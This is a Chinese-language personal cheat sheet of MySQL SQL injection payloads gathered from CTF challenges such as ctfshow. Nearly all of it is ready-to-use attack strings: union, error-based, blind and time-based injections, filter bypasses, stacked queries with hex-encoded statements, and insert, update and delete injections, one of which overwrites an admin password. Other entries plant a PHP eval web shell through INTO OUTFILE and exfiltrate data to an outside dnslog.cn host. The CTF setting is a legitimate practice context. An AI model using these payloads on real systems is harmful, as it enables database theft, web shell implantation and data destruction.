**本人根据比赛和练习的积累（大部分直接复制的）**

## 最简单的方法

```tex
# 查数据库
payload="-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
# 查列名
payload="-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"
# 查flag
payload="-1'union select id,username,password from ctfshow_user --+"
```

## mysql弱比较



## 内联注释绕过

在mysq中的三种注释方法：`--`和`#`（单行注释）和`/* */`（多行注释）。如果在`/*`后加惊叹号`!`意为`/* */`里的语句将被执行。
在mysql中`/*! ....*/`不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在`/*!....*/`中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行
如下语句`/*!50001 select * from test */;`这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行



## mysql8新特性

`table [表名]`显示表内容

```sql
table users limit 0,1;
```

与SELECT的区别：
1.TABLE始终显示表的所有列
2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句

### 1.判断列数

```sql
TABLE users union VALUES ROW(1,2,3);
```

### 2.使用values判断回显位

```sql
select * from users where id=-1 union values row(1,2,3);
```

### 3.列出所有数据库名

```sql
table information_schema.schemata;
```

### 4.盲注查询任意表中的内容

语句`table users limit 1;`的查询结果：

```sql
mysql> table users limit 1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
```

实质上是`(id, username, password)`与`(1, 'Dumb', 'Dumb')`进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。
两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。

```sql
mysql> select ((1,'','')<(table users limit 1));
+-----------------------------------+
| ((1,'','')<(table users limit 1)) |
+-----------------------------------+
|                                 1 |
+-----------------------------------+
1 row in set (0.00 sec)

mysql> select ((2,'','')<(table users limit 1));
+-----------------------------------+
| ((2,'','')<(table users limit 1)) |
+-----------------------------------+
|                                 0 |
+-----------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Du','')<(table users limit 1));
+-------------------------------------+
| ((1,'Du','')<(table users limit 1)) |
+-------------------------------------+
|                                   1 |
+-------------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Dum','')<(table users limit 1));
+--------------------------------------+
| ((1,'Dum','')<(table users limit 1)) |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Dumb','')<(table users limit 1));
+---------------------------------------+
| ((1,'Dumb','')<(table users limit 1)) |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Dumb','D')<(table users limit 1));
+----------------------------------------+
| ((1,'Dumb','D')<(table users limit 1)) |
+----------------------------------------+
|                                      1 |
+----------------------------------------+
1 row in set (0.00 sec)
```

## 过滤空格

```sql
/**/
括号 SELECT(password),2,(3)from(ctfshow_user)%23
回车(%0a)
%09(tab键)
%0c
```

## 过滤了注释符#和--

一些题不需要注释

## 过滤引号

用`\`实现逃逸

## 写马（文件）

**检查权限**

```sql
show variables like '%secure%';
```

查看MySQL是否有读写文件权限

结果中secure_file_prive需要不为null

**写**

```sql
id=0' union select 1,"<?php eval($_POST[1]);?>" into outfile "/var/www/html/1.php%23"

id=1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+&page=1&limit=10
```

题目直接给了个写文件的语句
```sql
select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';
```
但是写入的内容不可控，不过呢into outfile后面还可以跟lines terminated by
比如
```sql
select * from ctfshow_user into outfile a.txt' lines terminated by 'abc';
```
这样所有查询出来的数据结尾都会加一个abc，并且写入到a.txt中
payload

```sql
filename=1.php' lines terminated by '<?php eval($_POST[1]);phpinfo();?>'%23
```

木马在dump/1.php中。
除了上面说的`lines terminated by`还有
`lines starting by`
`fields terminated by`

## DNSlog注入
```sql
select load_file(concat("//",(select database()),"zfzyk9.dnslog.cn/123"))
```
## 常用函数和运算符总结

```
hex

to_base64

reverse

substr(string ,pos,len)、mid，用法一样
pos从1开始

regexp
select * from customers where last_name regexp '^brush'
或者0'||(username)regexp'^brush'

load_file读源代码
data{'username':f"if(ascii(substr(load_file('/var/www/html/api/index.php'),{i},1))={j},1,0)",'password':'1'}
^表示查找的字符串必须以什么开头

char获得字符
字符c=char(ture+ture+ture......) (99个true)

ord、ascii获得ASCII

like

right join
select * from A right join B on A.aID = B.bID
右表(B)的记录将会全部表示出来,而左表(A)只会显示符合搜索条件的记录(例子中为: A.aID = B.bID)。A表记录不足的地方均为NULL。

md5('ffifdyop',true)= 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
会发现直接闭合掉了并且存在or，所以可以直接登录成功。

benchmark(10000000,md5('yu22x'));

md5($password,true) md5参数true
```

## 过滤where

可以使用having

```sql
select goods_price,goods_name from sw_goods where goods_price > 100
select goods_price,goods_name from sw_goods having goods_price > 100
```

解释：上面的having可以用的前提是我已经筛选出了goods_price字段，在这种情况下和where的效果是等效的，但是如果我没有select goods_price 就会报错！！因为having是从前筛选的字段再筛选，而where是从数据表中的字段直接进行的筛选的。

## 过滤sleep

```sql
concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'
```

以上代码等同于 sleep(5)
 但是通过题目测试发现延时很小，所以把timeout也改小点。

利用笛卡尔积来造成延时(因为连接表是一个很耗时的操作)
 AxB=A和B中每个元素的组合所组成的集合，就是连接表

```sql
select count(*) from information_schema.columns A, information_schema.columns B;
```

## 过滤substr

可以用left+right
 `riight(left('abcdef',3),1)`等价于`substr('abcdef',3,1)`

## 过滤数字

直接将不可见字符转成ascii
 比如`ascii(‘%01’)=1`

字符c=`char(ture+ture+ture......) (99个true)`

## 过滤information_schema

``` sql
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats)%23
```

因为其他库里面没有专门存储列名的，所以需要用到无列名注入。https://blog.csdn.net/qq_31620591/article/details/117067799

使用`sys.x$schema_table_statistics`

## 过滤`

当 ` 不能使用的时候，使用别名来代替：

```sql
select b from (select 1,2,3 as b union select * from admin)a;
```

## limit注入

```sql
?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
```

## 堆叠注入

**只有当调用函数库函数支持执行多条语句执行的时候才可以利用**

---

如利用mysql_multi_query()函数就支持多条SQL语句同时执行

---

还有Java项目的配置文件config.properties如下

```PHP
url=jdbc:mysql://127.0.0.1:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC
db_username=root
db_password=root
```

allowMultiQueries=true说明开启了堆叠

---



```sql
简单的介绍一下预处理语句
prepare name from SQL语句					# 预定义SQL语句
execute name								# 执行预定义语句
(DEALLOCATE || DROP) PREPARE name;			# 删除与定义语句
预定义语句也可以通过变量的方式来执行
SET @tn = 'table_name'						# 储存表名
SET @sql = concat('select * from', @tn);	# 储存SQL语句	
prepare name from @sql;						# 预定义语句
execute name;								# 执行预定义语句
(DEALLOCATE || DROP) prepare @sql;  		# 删除预定义SQL语句		
```

```sql
1;update(ctfshow_user)set`username`=1;
1;update(ctfshow_user)set`pass`=1;
```
```sql
#获取表名
?username=1';prepare h from 0x73686f77207461626c6573;execute h;
#获取数据
?username=1';prepare h from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute h;
```

```sql
##1.php  <?php eval($_POST[1]);?>
?username=1';prepare h from 0x73656c65637420273c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f312e70687027;execute h;
```


简单情况：`show databases;show tables;show columns from “表名”;`

0x01 重命名

```
通过将`1919810931114514`表改成words表，将该表中的flag改为id，使得一开始的查询语句由 select id from words where id=‘’ 变成 select flag from `1919810931114514` where flag=’’
从而查询出flag
payload: 1';rename table `words` to `a`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);
接着直接 1’ or 1=1# 即可查询出flag。
```
0x02 预处理（set + prepare + execute）
```
因为 set后面是字符串所以我们可以用拼接或者十六进制的方式绕过过滤。

payload:1'; Set @a=concat("sele","ct flag from `1919810931114514`");prepare h from @a;execute h;或者
1'; Set @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare h from @a;execute h;
```
0x03 命令执行
```
介于0x02的方法上，我们还可以深入些，比如写入木马，只需要将 @a后面的字符串修改下即可，比如 @a=select “<?php eval($_POST['a']);?>” into outfile"/var/www/html/1.php"，当然我们不可能直接这么写，需要转成16进制。我们也可以，当然我们更能自己写一个查询语句，不过这样做有些多此一举。
那么如果这道题增加了过滤（ select，set，prepare，rename）怎么办呢？
```
0x04 handler
```
介绍一下这个函数，有类似于select的功能，更强大的是，他可以在不知道字段名的前提下查询出字段的值。
payload：1';handler `1919810931114514` open as aaa;handler aaa read first;
其中的aaa为我们自己定义的名字，first为读第一行数据，与他并列的还有next（读取下一行）；
```

## insert注入

```sql
#改admin密码
password=1',1),('admin','yourpasswd',1),('ac','m

#获取表名
username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()))%23&password=1

#获取列名
username=1',(select group_concat(column_name) from information_schema.columns where table_name='flag'))%23&password=1

#获取数据
username=1',(select group_concat(flagass23s3) from flag))%23&password=1
```

## delete注入

盲注

```sql
0||if(substr((select flag from flag),{i},1)="{j}",sleep(1),0)
```

delete注入容易把一张表全部删除

```sql
delete from some_table where id = 1 or 1;
```

如上，当where后面的值为True时，会删除整张表

应该加一个`and sleep(1)`确保返回为假

```sql
delete from some_table where id = 1 and sleep(1);
```

然后再考虑盲注


## update注入

```sql
#获取所有表名
password=',username=(select  group_concat(table_name) from information_schema.tables where table_schema=database())%23&username=1

#获取所有列名
password=',username=(select  group_concat(column_name) from information_schema.columns where table_name='flaga')%23&username=1

#获取flag
password=',username=(select  group_concat(flagas) from flaga)%23&username=1
```

update之前，还对password字段进行了处理，不能传入单引号，不过可以传入\

```sql
update ctfshow_user set password = '{$password}' where username = '{$username}'
```

假设我们password传入`\`，username传入`,username=database()#`
那么最终构成的语句如下

```sql
update ctfshow_user set pass = '\' where username = ',username=database()#'
等价于
update ctfshow_user set pass = '...',username=database()#'
```

## 报错注入

**1.floor()**
```sql
id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

floor替换成ceil或者round

**2.extractvalue()**
```sql
id = 1 and (extractvalue(1, concat(0x5c,(select user()))))
```

```sql
startid=extractvalue(1,concat('~',(table/**/flag1)))--&endid=1
```
`table`列出表中全部内容

**3.updatexml()**

```sql
id = 1 and (updatexml(0x3a,concat(1,(select user())),1))
```
```sql
http://eci-2ze4a7qin4ony7tlbbey.cloudeci1.ichunqiu.com/?name=year from `sale_datetime`)) and updatexml(1,concat(1,(select mid(flag,9,40) from flag),1),1)%23
```
**4.exp()**

```sql
id =1 and EXP(~(SELECT * from(select user())a))
```

**5.有六种函数（但总的来说可以归为一类）**

**GeometryCollection()**

```sql
id = 1 AND GeometryCollection((select * from (select * from(select user())a)b)) polygon()
id =1 AND polygon((select * from(select * from(select user())a)b)) multipoint()
id = 1 AND multipoint((select * from(select * from(select user())a)b)) multilinestring()
id = 1 AND multilinestring((select * from(select * from(select user())a)b))
```

**linestring()**
```sql
id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
```

**multipolygon()**
```sql
id =1 AND multipolygon((select * from(select * from(select user())a)b))
```

例子

```sql
#获取表名
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23

#获取列名
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag')))%23

#获取flag（报错注入有长度限制，所以需要拼接下）
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from ctfshow_flag)))%23
1'||extractvalue(0x0a,concat(0x0a,(select right(group_concat(flag),20) from ctfshow_flag)))%23
```

```sql
#获取表名
1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取列名
1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flags'  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取数据
1' union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
```
**6.**
uuid相关函数	8.0.x	`UUID_TO_BIN ` `BIN_TO_UUID`
BIGINT溢出	5.5.5及其以上版本

## group by注入

直接盲注

```sql
?u=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)='{1}',username,2)".format(i,j)
```

## order by注入

```sqlite
?order=id and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end

?order=if(表达式，1，sleep(1))
```

## 宽字节注入

https://blog.csdn.net/qq_45927819/article/details/123763888

## 其他

在  MySQL 中，存储过程和函数的信息存储在  information_schema  数据库下的  Routines  表中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:

```sql
SELECT * FROM information_schema.Routines
```

**锁表**

```sql
FLUSH TABLES WITH READ LOCK
```

执行了命令之后所有库所有表都被锁定只读。此时操作表会报错

解锁的语句是`unlock tables`

**字符串截断**

```php
$title = addslashes($_GET['title']);//addslashes() 函数返回在预定义字符之前添加反斜杠的字符串
$title = substr($title, 0, 10);
$sql="INSERT INTO wp_news VALUES(2, '$title', '$content')";
```

变量title被截取过10个字符，如果输入`aaaaaaaaa'`，会自动转义成`aaaaaaaaa\'`，截取后结果变成`aaaaaaaaa\`

```php
INSERT INTO some_table VALUES(2, 'aaaaaaaaa\', '$content')
```

正好转义单引号，我们就可以在变量content中注入了，可以用VALUES注入

```php
?title=aaaaaaaaa'&content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#
```

## 二次注入

以上类型都有可能
